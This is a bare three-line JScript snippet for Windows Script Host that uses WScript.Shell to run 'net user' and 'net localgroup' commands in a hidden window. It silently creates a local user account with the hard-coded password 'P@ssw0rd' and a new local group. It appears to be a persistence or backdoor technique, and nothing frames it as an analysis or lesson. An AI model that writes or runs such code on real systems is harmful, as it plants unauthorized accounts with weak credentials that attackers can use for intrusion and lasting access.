var wshShell = new ActiveXObject("WScript.Shell");
wshShell.Run('net user NewUser P@ssw0rd /add', 0, true);
wshShell.Run('net localgroup NewGroup /add', 0, true);